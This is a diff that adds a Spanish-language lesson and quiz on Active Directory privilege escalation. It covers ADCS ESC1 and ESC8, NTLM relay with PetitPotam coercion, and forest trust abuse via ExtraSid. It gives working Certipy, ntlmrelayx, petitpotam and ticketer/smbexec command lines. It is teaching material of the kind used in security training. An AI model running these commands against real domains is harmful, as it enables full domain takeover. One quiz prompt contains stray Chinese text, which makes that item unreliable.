@@ -1,0 +1,88 @@
+---
+index: 2
+title: "ADCS (ESC1-ESC8) y NTLM Relay"
+questions:
+  - id: ad-avanzado-t02-q01
+    prompt: "¿Qué servicio de Windows emite certificados que pueden usarse para autenticación Kerberos?"
+    hint: "Active Directory Certificate Services (ADCS)."
+    kind: text
+  - id: ad-avanzado-t02-q02
+    prompt: "¿Qué misconfiguración de ADCS (ESC1) permite especificar un SAN arbitrario en la solicitud de certificado?"
+    hint: "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT — el usuario define el Subject Alternative Name."
+    kind: text
+  - id: ad-avanzado-t02-q03
+    prompt: "¿Qué herramienta de自动化 explota ESC8 (HTTP → LDAP relay) para obtener un certificado de Domain Admin?"
+    hint: "Certipy o PetitPotam + ntlmrelayx."
+    kind: choice
+    options:
+      - id: a
+        label: "Nmap"
+      - id: b
+        label: "Certipy (o ntlmrelayx + Certipy para el relay)"
+      - id: c
+        label: "sqlmap"
+      - id: d
+        label: "Burp Suite"
+---
+
+## ADCS: los certificados que abren el dominio
+
+**ADCS** (Active Directory Certificate Services) emite certificados digitales.
+Si un certificado permite autenticación Kerberos y puedes obtenerlo como otro
+usuario → puedes impersonarlo.
+
+### ESC1: enrollee supplies subject (el más común)
+
+La plantilla de certificado permite al solicitante especificar el **SAN** (Subject
+Alternative Name). Un usuario normal pide un certificado con SAN=administrator@corp:
+
+```bash
+# Con Certipy (Python):
+certipy req -u user@corp.local -p password -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
+
+# Obtienes un .pfx que AUTENTICA como administrator
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
+```
+
+### ESC8: NTLM Relay to ADCS
+
+El endpoint web de ADCS (`http://ca/certsrv`) acepta NTLM. Combinado con una
+coerción de autenticación:
+
+```bash
+# 1. Configurar el relay (ntlmrelayx apunta al ADCS web)
+ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# 2. Coaccionar al DC a autenticarse contra TU máquina (PetitPotam)
+petitpotam.py TU_IP dc01.corp.local
+
+# 3. ntlmrelayx obtiene un certificado del DC → Pass-the-Ticket → dominio
+```
+
+## NTLM Relay: el ataque de intermediario
+
+NTLM no tiene binding de canal (channel binding) por defecto → una autenticación
+puede "reenviarse" a otro servicio:
+
+```text
+Víctima (DC) ──NTLM──► Atacante (relay) ──NTLM──► Servicio objetivo (LDAP/SMB/ADCS)
+```
+
+**PetitPotam** y **PrinterBug** son coercers: obligan a una máquina Windows a
+autenticarse contra una IP que TÚ controlas, iniciando el relay.
+
+## Trust attacks: del hijo al padre
+
+En un bosque multi-dominio, un atacante en `child.corp.local` puede comprometer el
+dominio padre `corp.local` abusando del **trust ticket**:
+
+```bash
+# Extraer la trust key del dominio hijo
+ticketer.py -domain child.corp.local -domain-sid S-1-5-21-CHILD... -extra-sid S-1-5-21-PARENT... -spn krbtgt/corp.local child_admin
+
+# Usar el ticket para acceder al dominio padre
+export KRB5CCNAME=child_admin.ccache && smbexec.py -k corp.local/admin@dc01.corp.local
+```
+
+El **ExtraSid** (SID History) es el mecanismo: el ticket incluye el SID del Domain
+Admin del padre → acceso total.
